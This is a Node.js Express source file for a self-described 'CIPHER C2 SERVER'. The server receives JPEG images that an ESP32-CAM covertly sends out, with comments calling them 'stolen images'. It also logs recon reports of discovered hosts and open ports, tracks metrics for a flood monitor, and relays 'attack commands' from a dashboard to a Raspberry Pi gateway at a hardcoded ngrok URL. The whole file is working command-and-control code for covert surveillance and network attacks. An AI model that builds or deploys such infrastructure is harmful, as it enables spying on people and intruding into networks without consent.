require('dotenv').config();
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 5000;
const UPLOAD_DIR = path.join(__dirname, 'uploads');

// Fallback RPi Gateway URL for triggers
// If you're not using ngrok, this should be the public IP of the RPi or your router
const RPI_GATEWAY_URL = process.env.RPI_GATEWAY_URL || 'https://nearness-hypocrisy-lion.ngrok-free.dev';

app.use(cors());
// Middleware to parse raw binary data (for JPEG uploads) and JSON
app.use(express.raw({ type: 'image/jpeg', limit: '10mb' }));
app.use(express.json());

// Ensure uploads directory exists
if (!fs.existsSync(UPLOAD_DIR)) {
  fs.mkdirSync(UPLOAD_DIR);
}

// Serve uploaded images statically
app.use('/images', express.static(UPLOAD_DIR));

// Serve React Dashboard statically (frontend)
app.use(express.static(path.join(__dirname, 'dashboard/dist')));

// ----------------------------------------------------
// Server-Sent Events (SSE) Client Management
// ----------------------------------------------------
let sseClients = [];

const pushEventToClients = (event, data) => {
  sseClients.forEach((client) => {
    client.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
  });
};

// ----------------------------------------------------
// Global State for Recon & Metrics
// ----------------------------------------------------
let reconDevices = [];
let deviceMetrics = {}; // Format: { "ip": [{ time: "HH:mm:ss", pktRate: 0, threatScore: 0 }] }
let deviceSummary = []; // Snapshot of all devices from RPi

// ----------------------------------------------------
// Endpoints
// ----------------------------------------------------

/**
 * 1. Image Exfiltration Receiver
 * The ESP32-CAM will POST raw JPEG binaries here.
 */
app.post('/api/upload', (req, res) => {
  if (!req.body || req.body.length === 0) {
    return res.status(400).send('No image data received');
  }

  // Generate a timestamped filename
  const timestamp = Date.now();
  const filename = `capture_${timestamp}.jpg`;
  const filepath = path.join(UPLOAD_DIR, filename);

  // Write binary data to disk
  fs.writeFile(filepath, req.body, (err) => {
    if (err) {
      console.error('[!] Failed to save image:', err);
      return res.status(500).send('File save error');
    }
    
    console.log(`[+] Received exfiltrated image: ${filename} (${req.body.length} bytes)`);

    // Create an image object for the gallery
    const newImage = {
      name: filename,
      url: `/images/${filename}`,
      time: new Date(timestamp).toLocaleString(),
      timestamp: timestamp,
      size: req.body.length
    };

    // Push the new image to all connected dashboard clients via SSE
    pushEventToClients('new_image', newImage);

    res.status(200).send('OK');
  });
});

/**
 * 2. Recon Report Receiver
 * The ESP32-CAM will POST found devices here.
 * Expected JSON: { "ip": "10.42.0.x", "ports": [80, 443], "device": "ESP32" }
 */
app.post('/api/recon/report', (req, res) => {
  const { ip, ports, device } = req.body;
  if (!ip) return res.status(400).send('Missing IP');

  console.log(`[+] Recon Report: Host ${ip} found with ports: ${ports}`);

  const existingDevice = reconDevices.find(d => d.ip === ip);
  if (existingDevice) {
    // Update ports if already exists
    existingDevice.openPorts = Array.from(new Set([...existingDevice.openPorts, ...(ports || [])]));
  } else {
    reconDevices.push({
      ip,
      openPorts: ports || [],
      deviceGuess: device || 'Unknown',
      discoveredAt: new Date().toLocaleTimeString()
    });
  }

  res.status(200).send('OK');
});

/**
 * 3. Recon Results Fetcher
 * Used by the Dashboard to populate the Recon tab.
 */
app.get('/api/recon', (req, res) => {
  res.json(reconDevices);
});

/**
 * 4. Metrics Report Receiver
 * The RPi Gateway will POST device stats here.
 * Expected JSON: { "ip": "10.42.0.x", "pktRate": 120, "threatScore": 50 }
 */
app.post('/api/metrics/report', (req, res) => {
  const { ip, pktRate, threatScore } = req.body;
  if (!ip) return res.status(400).send('Missing IP');

  const time = new Date().toLocaleTimeString([], { hour12: false });
  
  if (!deviceMetrics[ip]) {
    deviceMetrics[ip] = [];
  }
  
  deviceMetrics[ip].push({ time, pktRate: pktRate || 0, threatScore: threatScore || 0 });
  
  // Keep only last 100 samples
  if (deviceMetrics[ip].length > 100) {
    deviceMetrics[ip].shift();
  }

  res.status(200).send('OK');
});

/**
 * 5. Metrics Fetcher
 * Used by the Dashboard to populate the Flood Monitor.
 */
app.get('/api/metrics', (req, res) => {
  const { ip } = req.query;
  if (ip) {
    return res.json(deviceMetrics[ip] || []);
  }
  res.json(deviceMetrics);
});

/**
 * 6. Device Sync (Full List)
 * The RPi Gateway POSTs its entire discovered device list here.
 */
app.post('/api/devices/sync', (req, res) => {
  if (Array.isArray(req.body)) {
    deviceSummary = req.body;
  }
  res.status(200).send('OK');
});

/**
 * 7. Attack Trigger Relay
 * The React Dashboard sends attack commands here. We forward them to the RPi.
 */
app.post('/api/trigger', async (req, res) => {
  const { target, action } = req.body;
  if (!action) {
    return res.status(400).json({ error: "Missing 'action' in payload" });
  }

  console.log(`[*] Received trigger command from UI: ${action}`);

  // Clear recon results if a new recon is starting
  if (action === 'start_recon') {
    reconDevices = [];
    console.log(`[*] Cleared previous recon results for new scan`);
  }

  try {
    // Forward to the Raspberry Pi Relay
    const relayUrl = `${RPI_GATEWAY_URL}/command`;
    console.log(`[*] Forwarding to RPi at ${relayUrl}`);
    
    const response = await fetch(relayUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ target: target || 'esp32cam', action })
    });

    if (!response.ok) {
        throw new Error(`RPi responded with status ${response.status}`);
    }

    const data = await response.json();
    res.json({ status: "Success", relay_response: data });
  } catch (error) {
    console.error(`[!] Failed to relay command to RPi:`, error.message);
    res.status(502).json({ error: "Failed to reach RPi Gateway", details: error.message });
  }
});

/**
 * 3. Gallery Endpoint
 * Returns a list of all stolen images currently on disk.
 */
app.get('/api/gallery', (req, res) => {
  fs.readdir(UPLOAD_DIR, (err, files) => {
    if (err) return res.status(500).json({ error: "Failed to read uploads" });

    const images = files
      .filter(f => f.endsWith('.jpg'))
      .map(f => {
        const stats = fs.statSync(path.join(UPLOAD_DIR, f));
        return {
          name: f,
          url: `/images/${f}`,
          time: new Date(stats.mtimeMs).toLocaleString(),
          timestamp: stats.mtimeMs,
          size: stats.size
        };
      })
      .sort((a, b) => b.timestamp - a.timestamp); // Newest first

    res.json(images);
  });
});

/**
 * 4. SSE Feed Endpoint
 * The React Dashboard connects here to receive live image alerts.
 */
app.get('/api/feed', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders(); // Establish connection

  console.log(`[+] New dashboard client connected to live feed`);
  sseClients.push(res);

  // Remove client when they disconnect
  req.on('close', () => {
    console.log(`[-] Dashboard client disconnected`);
    sseClients = sseClients.filter(client => client !== res);
  });
});

// ----------------------------------------------------
// SPA Fallback for React Router
// ----------------------------------------------------
app.use((req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard/dist/index.html'));
});

// ----------------------------------------------------
// Start Server
// ----------------------------------------------------
app.listen(PORT, '0.0.0.0', () => {
  console.log(`=======================================`);
  console.log(`🔥 CIPHER C2 SERVER RUNNING ON PORT ${PORT} 🔥`);
  console.log(`=======================================`);
  console.log(`[+] Listening for stolen images at POST /api/upload`);
  console.log(`[+] Forwarding triggers to RPi at ${RPI_GATEWAY_URL}`);
  console.log(`[+] SSE Live Feed active at GET /api/feed`);
});
